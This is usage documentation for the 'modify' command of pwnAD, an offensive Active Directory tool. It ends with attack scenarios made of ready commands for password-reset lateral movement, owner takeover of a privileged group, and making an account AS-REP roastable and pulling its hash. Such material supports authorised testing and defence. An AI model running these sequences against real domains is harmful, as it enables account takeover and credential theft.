# modify Command

Modify objects and attributes in Active Directory.

## Usage

```bash
pwnAD [auth options] modify <subcommand> [arguments]
```

## Subcommands

| Subcommand | Description |
|------------|-------------|
| `password` | Change an account's password |
| `owner` | Change the owner of an object |
| `computer_name` | Rename a computer account |
| `dontreqpreauth` | Toggle DONT_REQ_PREAUTH flag |
| `disable_account` | Disable an account |
| `enable_account` | Enable an account |

## Subcommand Details

### password

Change the password for a specified account.

```bash
pwnAD [auth] modify password <target> <new_password>
```

**Example:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' --tls modify password lowpriv 'NewPassword123!'
```

!!! warning "TLS Required"
    Password changes require an encrypted connection. Use `--tls` or `start_tls` in interactive mode.

**Interactive example:**
```bash
pwnAD [domain.local\admin]> modify password lowpriv NewPassword123!
[-] Server unwilling to perform the operation...

pwnAD [domain.local\admin]> start_tls
[*] StartTLS succeded, you are now connected through a TLS channel

pwnAD [domain.local\admin]> modify password lowpriv NewPassword123!
[*] Successfully changed lowpriv password to: NewPassword123!
```

### owner

Change the owner of an AD object. The owner has implicit control over the object.

```bash
pwnAD [auth] modify owner <target> <new_owner>
```

**Example:**
```bash
# Make 'attacker' the owner of 'victim' object
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' modify owner victim attacker
```

### computer_name

Rename a computer account. Useful for certain attack techniques.

```bash
pwnAD [auth] modify computer_name <current_name> <new_name>
```

**Example:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' modify computer_name YOURPC$ NEWNAME$
```

### dontreqpreauth

Toggle the `DONT_REQ_PREAUTH` flag on an account. When enabled, makes the account vulnerable to AS-REP roasting.

```bash
pwnAD [auth] modify dontreqpreauth <target> <True|False>
```

**Example:**
```bash
# Enable (make vulnerable to AS-REP roast)
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' modify dontreqpreauth targetuser True

# Disable (restore security)
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' modify dontreqpreauth targetuser False
```

### disable_account

Disable a user or computer account.

```bash
pwnAD [auth] modify disable_account <target>
```

**Example:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' modify disable_account compromised_user
```

### enable_account

Enable a disabled user or computer account.

```bash
pwnAD [auth] modify enable_account <target>
```

**Example:**
```bash
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' modify enable_account locked_user
```

## Attack Scenarios

### Scenario 1: Password Reset for Lateral Movement

```bash
# Reset password for account you have WriteProperty on
pwnAD --dc-ip 192.168.1.10 -d domain.local -u lowpriv -p 'Pass!' --tls modify password serviceaccount 'Compromised123!'

# Use the compromised account
pwnAD --dc-ip 192.168.1.10 -d domain.local -u serviceaccount -p 'Compromised123!' get membership serviceaccount
```

### Scenario 2: Owner Takeover

If you can modify the owner of an object, you gain control:

```bash
# Take ownership
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' modify owner "High Value Group" attacker

# Now attacker can modify the group
pwnAD --dc-ip 192.168.1.10 -d domain.local -u attacker -p 'Pass!' add groupMember "High Value Group" attacker
```

### Scenario 3: AS-REP Roasting Setup

Enable DONT_REQ_PREAUTH on a target account (requires WriteProperty):

```bash
# Enable AS-REP roastability
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' modify dontreqpreauth targetuser True

# Get AS-REP hash
GetNPUsers.py domain.local/targetuser -no-pass -dc-ip 192.168.1.10

# Restore (cleanup)
pwnAD --dc-ip 192.168.1.10 -d domain.local -u admin -p 'Pass!' modify dontreqpreauth targetuser False
```
